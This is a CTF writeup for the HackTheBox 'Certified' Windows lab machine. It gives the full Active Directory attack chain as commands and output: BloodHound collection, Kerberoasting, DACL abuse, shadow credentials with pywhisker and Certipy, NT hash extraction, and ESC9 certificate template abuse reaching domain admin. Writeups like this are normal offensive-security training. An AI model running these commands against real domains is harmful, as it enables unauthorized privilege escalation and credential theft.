---
layout: default
title: HackTheBox - Certified
parent: Writeups
nav_order: 1
---

# HackTheBox - Certified

<img src="/assets/images/writeups/certified/certified-logo.png" alt="Certified Logo" style="background: transparent; border-radius: 50%;">
## Overview

**Difficulty:** Medium  
**OS:** Windows  

[Play Certified on HackTheBox](https://app.hackthebox.com/machines/Certified?tab=play_machine)




## Initial Access - Assumed Breach

We start with compromised credentials:
```bash
judith.mader:judith09
```

## Enumeration

### BloodHound Collection

Collect all AD data for BloodHound analysis:
```bash
# Using NetExec
nxc ldap certified.htb -u judith.mader -p judith09 --bloodhound -c all --dns-server 10.10.11.41

# Or using bloodhound-python
bloodhound-python -u 'judith.mader' -p judith09 -d certified.htb -dc DC01.CERTIFIED.HTB -ns 10.10.11.41 -c all --zip
```

Start neo4j and launch BloodHound:
```bash
sudo neo4j start
bloodhound
```

### Kerberoasting Attempt

Try to get service principal names:
```bash
impacket-GetUserSPNs 'certified.htb/judith.mader:judith09' -request
```

Copy the hash and attempt to crack it:
```bash
hashcat hash /usr/share/wordlists/rockyou.txt
```

**Note:** This hash cannot be cracked - keep this in mind for later.

## Privilege Escalation Path

### BloodHound Analysis

1. Search for `judith.mader` and mark as owned
2. Select "Node Info" tab → "Transitive Object Control"
3. **Pro tip:** Right-click on edges in BloodHound to get help with abuse commands

The attack path shows:
- `judith.mader` has `WriteOwner` on `MANAGEMENT` group
- `MANAGEMENT` group has `GenericWrite` on `MANAGEMENT_SVC`
- `MANAGEMENT_SVC` has `GenericAll` on `CA_OPERATOR`

### Step 1: Modify DACL and Add to Management Group

Grant ourselves WriteMembers on the Management group:
```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```

Add ourselves to the Management group:
```bash
net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "10.10.11.41"
```

**Note:** Don't forget the `=` in your `/etc/krb5.conf`

### Step 2: Shadow Credentials Attack on management_svc

Install pywhisker if needed:
```bash
python3 -m venv venv
source venv/bin/activate
pip3 install pywhisker
```

Add shadow credentials to `management_svc`:
```bash
pywhisker -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
```

**Output:** PFX password: `RijBTt2Ke1LwvNplSyRd`

### Step 3: Get TGT with PKINITtools

Clone and use PKINITtools:
```bash
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools

python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx /home/veggie/htb/certified/8DmrZnbv.pfx -pfx-pass RijBTt2Ke1LwvNplSyRd management.ccache
```

Extract the NT hash:
```bash
KRB5CCNAME=management.ccache python3 getnthash.py certified.htb/management_svc -key c11c4280a63ed4e89532b9eb8d7a928c51919034d945d82bcc251be231f85e06
```

**NT Hash:** `a091c1832bcdd4677c28b5a6a1295584`

### Step 4: Shadow Credentials on ca_operator

From BloodHound: `management_svc` has `GenericAll` over `ca_operator`

Use Certipy to perform shadow credentials attack:
```bash
certipy-ad shadow auto -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator
```

**NT Hash for ca_operator:** `b4b86f45c6018f1b664f70805f45d8f2`

## Certificate Authority Exploitation (ESC9)

### Enumerate Certificate Templates
```bash
certipy-ad find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ns 10.10.11.41
```

Search for ESC vulnerabilities:
```bash
cat 20250311060801_Certipy.txt | grep ESC
```

**Found:** ESC9 vulnerability in `CertifiedAuthentication` template

Reference: [Certipy ESC9/ESC10](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc9--esc10)

### Exploit ESC9

Update `ca_operator` UPN to Administrator:
```bash
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
```

Request certificate as Administrator:
```bash
certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication
```

Restore original UPN:
```bash
certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
```

## Domain Admin

Authenticate with the certificate:
```bash
certipy-ad auth -pfx administrator.pfx -domain certified.htb
```

**Administrator NT Hash:** `0d5b49608bbce1751f708748f67e2d34`

Verify access:
```bash
nxc smb certified.htb -u administrator -H 0d5b49608bbce1751f708748f67e2d34
```

## Key Takeaways

1. **BloodHound tip:** Right-click edges for abuse commands
2. **Shadow Credentials:** Powerful attack when you have GenericAll/GenericWrite
3. **ESC9:** Certificate UPN manipulation for privilege escalation
4. **Attack Chain:** WriteOwner -> Group Membership -> Shadow Creds -> Certificate Abuse -> DA

## Tools Used

- NetExec / CrackMapExec
- BloodHound
- Impacket suite
- PyWhisker
- PKINITtools
- Certipy-AD